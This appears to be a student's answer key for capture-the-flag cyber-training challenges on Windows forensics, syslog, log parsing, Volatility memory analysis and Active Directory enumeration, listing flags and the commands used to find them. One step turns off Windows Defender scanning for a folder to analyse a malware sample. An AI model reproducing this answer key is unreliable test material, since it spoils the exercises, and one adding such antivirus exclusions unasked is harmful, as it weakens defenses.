## Windows_Browser_Artifacts_2 *
2: Find the questionable website that a user browsed to (using Chrome), that appears to be malicious. *Note: There are more than one users on the box. - ``` https://www.exploit-db.com ```

        get-content 'C:\users\student\AppData\Local\Google\Chrome\User Data\Default\History'
______________________________________________________________________________________________________________________________________________________________________________________
## Windows_Recent_Files_2 *
2: There is a file that was recently opened that may contain PII. Get the flag from the contents of the file. - ``` Flag, Found A. ```

        reg query hkcu\software\microsoft\windows\currentversion\explorer\recentdocs
        get-item 'Registry::\HKEY_USERS\*\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs\.*' - [System.Text.Encoding]::Unicode.GetString((gp "REGISTRY::HKEY_USERS\*\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs\.txt")."6")
______________________________________________________________________________________________________________________________________________________________________________________
## Windows_BAM_2 *
2: Enter the full path of the program that was run on this computer from an abnormal location. - ``` C:\Windows\Temp\bad_intentions.exe ```

        Get-Item HKLM:\SYSTEM\CurrentControlSet\Services\bam\UserSettings\*
______________________________________________________________________________________________________________________________________________________________________________________
## Windows_Prefetch_2-3 *
2: Enter the name of the questionable file in the prefetch folder. - ``` DARK_FORCES-8F2869FC.pf ```

        get-childitem -Path 'C:\Windows\Prefetch' -ErrorAction Continue
______________________________________________________________________________________________________________________________________________________________________________________
3: What is the creation time of the questionable file in the prefetch folder? - ``` 02/23/2022 ```
______________________________________________________________________________________________________________________________________________________________________________________
## Windows_Recycle_Bin_3 *
3: Recover the flag from the Recycle Bin. Enter the name of the recycle bin file that contained the contents of the flag, and the contents of the deleted file. Include the file extension in your answer. - ``` $RZDAQ4U.txt,DontTrashMeyo ```

        Get-Childitem 'C:\$RECYCLE.BIN' -Recurse -Verbose -Force | select FullName
        get-content 'C:\$RECYCLE.BIN\S-1-5-21-2881336348-3190591231-4063445930-1003\$RZDAQ4U.txt'
______________________________________________________________________________________________________________________________________________________________________________________
## Windows_Jump_Lists *
Find the file in the jump list location that might allow privilege escalation. - ``` ??? ```

        Get-ItemProperty -Path "C:\Users\<Username>\AppData\Roaming\Microsoft\Windows\Recent\AutomaticDestinations\*" | Select-Object Name, LastWriteTime
______________________________________________________________________________________________________________________________________________________________________________________
## Windows_Logs_4 *
4: Check event logs for a "flag" string. - ``` 3v3nt_L0g ```

        Get-EventLog -LogName System | Select-String -InputObject {$_.message} -Pattern 'Flag'
______________________________________________________________________________________________________________________________________________________________________________________
# |
# |
# |
# |
# |
# 14_Linux_Auditing_And_Logging
## Linux_Auditing_And_Logging_XML_1-2 *
1: Identify the XML element name in the output below. - ``` scaninfo ```

scaninfo type="syn" protocol="tcp" numservices="200" services="1-200"/
______________________________________________________________________________________________________________________________________________________________________________________
2: Identify one of the XML attributes in the output below. - ``` protocol="tcp" ```

scaninfo type="syn" protocol="tcp" numservices="200" services="1-200"/
______________________________________________________________________________________________________________________________________________________________________________________
## Linux_Auditing_And_Logging_Standards_1-4 *
1: What RFC is Syslog? - ``` 5424 ```
______________________________________________________________________________________________________________________________________________________________________________________
2: What is the numerical code assigned to the facility dealing with authorization? - ``` 4 ```
______________________________________________________________________________________________________________________________________________________________________________________
3: How many severity codes are defined in the standard that defines syslog? - ``` 8 ```
______________________________________________________________________________________________________________________________________________________________________________________
4: What severity is assigned to system instability messages? - ``` 0 ```
______________________________________________________________________________________________________________________________________________________________________________________
## Linux_Auditing_And_Logging_SysLog_1-8 *
1: Download the attached rsyslog configuration file for the Syslog # challenges. In the legacy rules section of the file, what facility is logged to 0.log? - ``` kern ```
______________________________________________________________________________________________________________________________________________________________________________________
2: In the legacy rules section of the file, how many severities are logged to 0.log? - ``` 8 ```
______________________________________________________________________________________________________________________________________________________________________________________
3: List the severities from highest severity (lowest numerical listed) to lowest severity (highest numerical listed) using their severity name. - ``` Emergency,Alert,Critical,Error,Warning ```

        (line 10) 4.4 -/var/log/4min.log
        (0,1,2,3,4)
______________________________________________________________________________________________________________________________________________________________________________________
4: List the severities from highest severity (lowest numerical listed) to lowest severity (highest numerical listed), using their severity name. - ``` Notice,Informational,Debug ```

        (line 11)4.!4 -/var/log/4sig.log
        (5,6,7) 
______________________________________________________________________________________________________________________________________________________________________________________
5: What is being logged in not.log? Provide the facilities from lowest facility to highest facility numerically, and the severity being logged. (List only the first word for each.) - ``` mail,clock,ntp,notice ```

        (line 12)2,9,12.=5 /var/log/not.log
        (mail system{2},clock daemon{9},ntp subsystem{12},notice{.=15})
______________________________________________________________________________________________________________________________________________________________________________________
6: What facilities and what severities are being sent to a remote server over a reliable connection using port 514? Provide the facility names, number of severities, and the correct destination IP address. - ``` auth,authpriv,8,10.30.0.1 ```
______________________________________________________________________________________________________________________________________________________________________________________
7: Use the answer from Syslog 6 for this question. Do logs that match this filter ever get saved on the local machine? - ``` Yes ```
______________________________________________________________________________________________________________________________________________________________________________________
8: What messages are being sent to 10.84.0.1? Provide the facility number, the number (amount) of severity codes, and Layer 4 connection type as the answer. - ``` 0,7,UDP ```
______________________________________________________________________________________________________________________________________________________________________________________
## Linux_Auditing_And_Logging_XML_3-4 *
3: Parse all of the IP addresses from the file using XPATH queries - ``` 0e850f14fc192c5105955ec094287bd2 ```

        $ xpath -q -e '//host/address/@addr' output.xml | md5sum
______________________________________________________________________________________________________________________________________________________________________________________
4: Select all of the IP addresses and ports using a single XPATH Union Statement Pipe the result to md5sum for the flag - ``` ff7990139b6d09aa65afb6e069db0dec ```

        $ xpath -q -e '//host/address/@addr | //host/ports/port/@portid' output.xml | md5sum
______________________________________________________________________________________________________________________________________________________________________________________
## Linux_Auditing_And_Logging_JSON_1-3 *
1: Use jq to pretty print the JSON file conn.log. Hash the pretty-printed file with md5sum for the flag. - ``` 25ebedf7442e470eaaa48b5f7d5b96f4 ```

        $ cat conn.log | jq .
        $ cat conn.log | jq . | md5sum
______________________________________________________________________________________________________________________________________________________________________________________
2: This file is a conn.log made in Zeek (Bro) with data about TCP/IP connections. Use jq to locate and count the unique originating endpoint IP addresses in the file. Enter the number of unique originating IP addresses as the flag. - ``` ??? ```
______________________________________________________________________________________________________________________________________________________________________________________
3: This file is a conn.log made in Zeek (Bro) with data about TCP/IP connections. Use jq to locate and count connections where the destination IP sent more than 40 bytes to the source IP. - ``` 177 ```

        $ cat conn.log | jq 'select(.resp_bytes >= 40).ts' | wc -l
______________________________________________________________________________________________________________________________________________________________________________________
## Linux_Auditing_And_Logging_SysLog_9-10 *
9: Which cron log severity code is saved only to the local machine? - ``` 7 ```
______________________________________________________________________________________________________________________________________________________________________________________
10: The emergency messages (only) on the system are sent to what IP Address? - ``` 10.24.0.1 ```
______________________________________________________________________________________________________________________________________________________________________________________
## Linux_Auditing_And_Logging_WHUT_1-3 *
1: How many unique users logged into this machine? - ``` 3 ```

        $ grep -E "Accepted password for" log.txt | awk '{print $9}' | sort | uniq | wc -l
______________________________________________________________________________________________________________________________________________________________________________________
2: What is the total amount of time users were logged into the machine? - ``` ??? ```
______________________________________________________________________________________________________________________________________________________________________________________
3: Identify the Cyber Attack Technique that Balrog is trying on the machine. - ``` ??? ```
______________________________________________________________________________________________________________________________________________________________________________________
## Linux_Auditing_And_Logging_XML_5 *
5: Select every IP address with open (in use) ports using XPATH queries and XPATH axes. Pipe the result to md5sum for the flag - ``` ??? ```
______________________________________________________________________________________________________________________________________________________________________________________
## Linux_Auditing_And_Logging_WHUT_4-5 *
4: What user successfully executed commands? - ``` ??? ```
______________________________________________________________________________________________________________________________________________________________________________________
5: Analyze the file to determine when a shell was spawned as a different user and how long it was maintained for. - ``` ??? ```
______________________________________________________________________________________________________________________________________________________________________________________
# |
# |
# |
# |
# |
# 15_Memory_Analysis
## Primer_Networking_1-6 *
1: What is used in Windows to implement the networking stack to enable communication with the four lowest OSI layers? - ``` NDIS ```
______________________________________________________________________________________________________________________________________________________________________________________
2: What Windows cmd.exe command will display the local computer's routing table? - ``` netstat -r ```
______________________________________________________________________________________________________________________________________________________________________________________
3: IANA assigned TCP/UDP ports in the range of 0-1023 that are usually associated with server-side services are known as? - ``` Well known ports ```
______________________________________________________________________________________________________________________________________________________________________________________
4: What term describes randomly assigned TCP/UDP ports above 1023 and are used for a short period of time (for the duration of a communication session}? - ``` Ephemeral ports ```
______________________________________________________________________________________________________________________________________________________________________________________
5: The two words that decribe translating Host names to IP addresses or NetBIOS names to IP addresses is_____? - ``` Name Resolution ```
______________________________________________________________________________________________________________________________________________________________________________________
6: What is the hierarchical service/protocol that translates hostnames to IP addresses? - ``` DNS ```
______________________________________________________________________________________________________________________________________________________________________________________
## Primer_Security_1-23 *
1: What is the term for the numeric value that the Windows OS uses to uniquely ID a user, group or computer? - ``` SID ```
______________________________________________________________________________________________________________________________________________________________________________________
2: What switch can be added to the CMD.exe command whoami, to view the SID of the current user? - ``` /user ```
______________________________________________________________________________________________________________________________________________________________________________________
3: What is the value of a Relative Identifier (RID) assigned to the 1st user account? - ``` 1000 ```
______________________________________________________________________________________________________________________________________________________________________________________
4: What is the well known RID for the Windows Built-In Administrator Local account? - ``` 500 ```
______________________________________________________________________________________________________________________________________________________________________________________
5: Complete the GET_CimInstance cmdlet to view all the user SIDs on a Windows host machine by Name and SID respectively: - ``` ??? ```
______________________________________________________________________________________________________________________________________________________________________________________
6: In Windows what else does a user's security Token contain? - ``` ??? ```
______________________________________________________________________________________________________________________________________________________________________________________
7: When contained in a Windows users access token, what privilege does SeBackupPrivilege grant to the user to perform on files and folders? - ``` Backup ```
______________________________________________________________________________________________________________________________________________________________________________________
8: Windows performs mandatory integrity checks (MICs) by comparing the integrity level of the resource with the integrity level of the calling process. Windows does this integrity check before the the objects discretionary access check because it is _____________? - ``` faster ```
______________________________________________________________________________________________________________________________________________________________________________________
9: A Windows object's Security _________ contains: - ``` Descriptor ```
______________________________________________________________________________________________________________________________________________________________________________________
10: What contains Access Control Entries (ACEs), that define the types of access a user or group may be granted to an object? - ``` DACL ```
______________________________________________________________________________________________________________________________________________________________________________________
11: What cmdlet gets objects that represent the security descriptor of a file or resource? - ``` Get-acl ```
______________________________________________________________________________________________________________________________________________________________________________________
12: What NET cmd.exe command can be used to enumerate the local Windows group accounts? - ``` Net localgroup ```
______________________________________________________________________________________________________________________________________________________________________________________
13: What Windows cmd.exe command will display or modify Access Control Lists (ACLs) for files and folders and resolves various issues that occur when using the older CACLS & XCACLS. - ``` icacls ```
______________________________________________________________________________________________________________________________________________________________________________________
14: What Windows security feature is a system-level memory protection feature that is built into the operating system starting with Windows XP and Windows Server 2003 and enables the system to mark one or more pages of memory as non-executable? - ``` DEP ```
______________________________________________________________________________________________________________________________________________________________________________________
15: What computer security technique is used in Windows to prevent exploitation of memory corruption vulnerabilities? This feature randomly arranges the address space positions of key data areas of a process, in order to prevent an attacker from reliably jumping to, a particular exploited function in memory. - ``` ASLR ```
______________________________________________________________________________________________________________________________________________________________________________________
16: What is a small kernel-mode library that can implement API hooking? - ``` shim ```
______________________________________________________________________________________________________________________________________________________________________________________
17: Which security feature helps keep attackers from gaining access through Pass-the-Hash or Pass-the-Ticket attacks using virtualization-based security to isolate secrets, such as NTLM password hashes and Kerberos Ticket Granting Tickets? - ``` Credential Guard ```
______________________________________________________________________________________________________________________________________________________________________________________
18: Introduced in Windows 8 this is Microsoft Antivirus, anti-malware solution? - ``` Windows Defender ```
______________________________________________________________________________________________________________________________________________________________________________________
19: What security technique helps prevent overwrites of the Structured Exception Handler? - ``` SEHOP ```
______________________________________________________________________________________________________________________________________________________________________________________
20: What security protection is built into Windows 10, as described in the "Memory reservations" item in Kernel pool protections? This includes protecting address space 0x00000000 (not listed in article). - ``` ??? ```
______________________________________________________________________________________________________________________________________________________________________________________
21: What Windows security feature prevents the replacement of essential system files, folders, and registry keys that are installed as part of the operating system? It became available starting with Windows Server 2008 and Windows Vista. - ``` Windows Resource Protection ```
______________________________________________________________________________________________________________________________________________________________________________________
22: What option should you use with the System File Checker cmd.exe tool sfc.exe to scan all protected system files, and replace corrupted files with a cached copy that is located in a compressed folder at %WinDir%\System32\dllcache ? - ``` /scannow ```
______________________________________________________________________________________________________________________________________________________________________________________
23: Where are copies of known-good critical system files located at %WinDir%___________ and used by the Windows Resource Protection feature? - ``` \WinSxS\Backup ```
______________________________________________________________________________________________________________________________________________________________________________________
## Primer_Networking_7-10 *
7: What CLI tool is often used to troubleshoot DNS issues but can also be used in reconnaissance? - ``` nslookup ```
______________________________________________________________________________________________________________________________________________________________________________________
8: In Windows 10 what is the full path to the hosts file? Complete the path c:\Windows____________ - ``` System32\drivers\etc\hosts ```
______________________________________________________________________________________________________________________________________________________________________________________
9: Fill in the missing component for the usual Host Name Resolution order: - ``` dns ```
______________________________________________________________________________________________________________________________________________________________________________________
10: What cmd.exe tool will display NetBIOS transport statistics in Windows? - ``` nbtstat ```
______________________________________________________________________________________________________________________________________________________________________________________
## Primer_Surveys_1-3 *
1: What team survey is focused on security and auditing? - ``` red ```
______________________________________________________________________________________________________________________________________________________________________________________
2: What type of survey is focused on computer system settings, updates, configurations and installed software? - ``` blue ```
______________________________________________________________________________________________________________________________________________________________________________________
3: What type of survey is focused on malware detection, artifact detection and investigating processes? - ``` Incident response ```
______________________________________________________________________________________________________________________________________________________________________________________
## Windows_Memory_Analysis_Plugin_1-3 *
1: What Volatility plugin will dump a process to an executable file sample? - ``` ??? ```
______________________________________________________________________________________________________________________________________________________________________________________
2: What Volatility plugin will extract command history by scanning for _COMMAND_HISTORY? - ``` ??? ```
______________________________________________________________________________________________________________________________________________________________________________________
3: What Volatility plugin will show driver objects? - ``` ??? ```
______________________________________________________________________________________________________________________________________________________________________________________
## Windows_Memory_Analysis_Basics_1-2 *
1: What plugin do you run to find which memory profile to use with a memory image? - ``` imageinfo ```
______________________________________________________________________________________________________________________________________________________________________________________
2: What switch/argument will list all plugins for Volatility? - ``` -h ```
______________________________________________________________________________________________________________________________________________________________________________________
## Windows_Volatility_Data *
In terms of Volatile Data, what locations are the MOST volatile? - ``` Registers,Cache ```
______________________________________________________________________________________________________________________________________________________________________________________
## Windows_Memory_Analysis_Basics_3-4 *
3: What is the 12th plugin listed in the Volatility help menu? - ``` cmdscan ```
______________________________________________________________________________________________________________________________________________________________________________________
4: What profile do you use in conjunction with this memory image? - ``` WinXPSP2x86 ```
______________________________________________________________________________________________________________________________________________________________________________________
## Windows_Malware_1-4 *
1: What command did the attacker type to check the status of the malware? - ``` sc query malware ```
______________________________________________________________________________________________________________________________________________________________________________________
2: What are the last 7 digits of the memory offset for the driver used by the malware? - ``` 1a498b8 ```
______________________________________________________________________________________________________________________________________________________________________________________
3: The process running under PID 544 seems malicious. What is the md5hash of the executable? - ``` 6CEE14703054E226E87A963372F767AA ```

    > Set-MpPreference -ExclusionPath 'C:\Users\andy.dwyer\Desktop\Memory_Analysis\'
    > cd C:\Users\andy.dwyer\Desktop\Memory_Analysis
    > .\volatility_2.6_win64_standalone.exe -f ".\0zapftis.vmem" --profile=WinXPSP2x86 procdump -p 544 -D .
    > Get-FileHash -Algorithm md5 .\executable.544.exe
______________________________________________________________________________________________________________________________________________________________________________________
4: What remote IP and port did the system connect to? - ``` 172.16.98.1:6666 ```

    > .\volatility_2.6_win64_standalone.exe -f ".\0zapftis.vmem" --profile=WinXPSP2x86 connscan
______________________________________________________________________________________________________________________________________________________________________________________
# |
# |
# |
# |
# |
# 16_Windows_Active_Directory_Enumeration
## Primer_Active_Directory_1-8 *
1: What is the database that is used to connect users with network resources? - ``` Active Directory ```
______________________________________________________________________________________________________________________________________________________________________________________
2: What are all things that are in active directory stored as? - ``` Objects ```
______________________________________________________________________________________________________________________________________________________________________________________
3: What is the Active Directory component which contains formal definitions of every object class that can be created in an Active Directory forest? - ``` schema ```
______________________________________________________________________________________________________________________________________________________________________________________
4: What protocol is used when accessing and updating the Active Directory? - ``` LDAP ```
______________________________________________________________________________________________________________________________________________________________________________________
5: From an Offensive perspective, what type of account is usually the main target? - ``` Administrator ```
______________________________________________________________________________________________________________________________________________________________________________________
6: Task : If an account has been inactive for a substantial amount of time what should the adminstrators do to the account? - ``` Disable ```
______________________________________________________________________________________________________________________________________________________________________________________
7: What is the basic PowerShell cmdlet used to enumerate users? - ``` Get-ADUser ```
______________________________________________________________________________________________________________________________________________________________________________________
8: What is the suite of tools used in CLI to enumerate users across the network? - ``` DS ```
______________________________________________________________________________________________________________________________________________________________________________________
## Windows_Active_Directory_Basics_1-4 *
1: What is the domain portion of the following SID:S-1-5-21-1004336348-1177238915-682003330-1000 - ``` 21-1004336348-1177238915-682003330 ```
______________________________________________________________________________________________________________________________________________________________________________________
2: What PowerShell command will list domain groups? - ``` Get-ADGroup ```
______________________________________________________________________________________________________________________________________________________________________________________
3: What PowerShell command will list all users and their default properties? - ``` Get-ADUser -filter * ```
______________________________________________________________________________________________________________________________________________________________________________________
4: What PowerShell command will allow you to search Active Directory accounts for expired accounts without having to create a filter? - ``` Search-ADAccount ```
______________________________________________________________________________________________________________________________________________________________________________________
## Windows_AD_Search_Accounts *
Find the expired accounts that aren't disabled. List the last names in Alphabetical Order, separated with a comma, and no space between. - ``` Krause,Page ```

        Get-ADUser -Filter {Enabled -eq $true} -Properties AccountExpirationDate | Where-Object {$_.AccountExpirationDate -lt (get-date) -and $_.Enabled -ne $null} | select-object GivenName
______________________________________________________________________________________________________________________________________________________________________________________
## Windows_AD_Search_Emails *
Find the unprofessional email addresses. List the email's domain. - ``` ashleymadison.com ```

        get-aduser -filter * -properties EmailAddress | where-object {$_.emailaddress -notlike "*mail.mil"} | select-object EmailAddress
______________________________________________________________________________________________________________________________________________________________________________________
## Windows_AD_Search_Files *
The flag is the unprofessionally-named file located somewhere on the Warrior Share. - ``` lulz.pdf ```

        get-childitem -force -recurse -erroraction SilentlyContinue | select Mode, LastWriteTime, Fullname
______________________________________________________________________________________________________________________________________________________________________________________
## Windows_AD_Search_Insider_1-2 *
1: The flag is the name of the file, where in the file contents, someone is requesting modified access rights. - ``` 14287.pdf ```

        net use * "\\file-server\warrior share"
______________________________________________________________________________________________________________________________________________________________________________________
2: The flag is the name of the user who is requesting modified access rights. - ``` Karen.Nance ```

        Get-ADUser -Filter * -Properties telephoneNumber | where-object {$_.telephoneNumber -like "*336-6754"}
______________________________________________________________________________________________________________________________________________________________________________________
## Windows_AD_Search_Naming *
Find the accounts that contain unprofessional information in the description. - ``` Ibarra,Lee ```

        Get-ADUser -Filter * -Properties Description | select Description
        Get-ADUser -Filter * -Properties Description | where-object {$_.Description -notlike "*PLT Soldier"} | select-object Description
        Get-ADUser -Filter * -Properties Description | where-object {$_.Description -like "*description"}
______________________________________________________________________________________________________________________________________________________________________________________
## Windows_AD_Search_Passwords *
Find the following three accounts: - ``` ??? ```

two accounts with passwords that never expire NOT andy.dwyer

one account that has its password stored using reversible encryption

List the last names in Alphabetical Order, comma-separated, no spaces. Do not list built-in accounts.
______________________________________________________________________________________________________________________________________________________________________________________
## Windows_AD_Search_PII *
The flag is the name of the file containing PII on the Warrior Share. - ``` phone_matrix.xlsx ```

        get-childitem -force -recurse -erroraction SilentlyContinue | select Mode, LastWriteTime, Fullname
______________________________________________________________________________________________________________________________________________________________________________________
## Windows_Active_Directory_Basics_5-8 *
5: Find the short name of the domain in which this server is a part of. - ``` army ```

        get-addomaincontroller -filter *
______________________________________________________________________________________________________________________________________________________________________________________
6: What is the RID of the krbtgt account. - ``` 502 ```

        Get-ADUser -Filter * -Properties * | where-object {$_.name -like "*krbtgt"}
______________________________________________________________________________________________________________________________________________________________________________________
7: How many users are members of the Domain Admins group? - ``` ??? ```
______________________________________________________________________________________________________________________________________________________________________________________
8: How many total users are members of the Domain Admins group? - ``` ??? ```
______________________________________________________________________________________________________________________________________________________________________________________
## Windows_AD_Follow_Insider_Trail_1-4 *
1: Continue to follow the insider trail to find additional insider threats and their compromised mission. - ``` ??? ```
______________________________________________________________________________________________________________________________________________________________________________________
2: Continue to follow the insider trail to find additional insider threats and their compromised mission. - ``` ??? ```
______________________________________________________________________________________________________________________________________________________________________________________
3: Continue to follow the insider trail to find additional insider threats and their compromised mission. - ``` ??? ```
______________________________________________________________________________________________________________________________________________________________________________________
4: Continue to follow the insider trail to find additional insider threats and their compromised mission. This flag is a video link. - ``` ??? ```
______________________________________________________________________________________________________________________________________________________________________________________
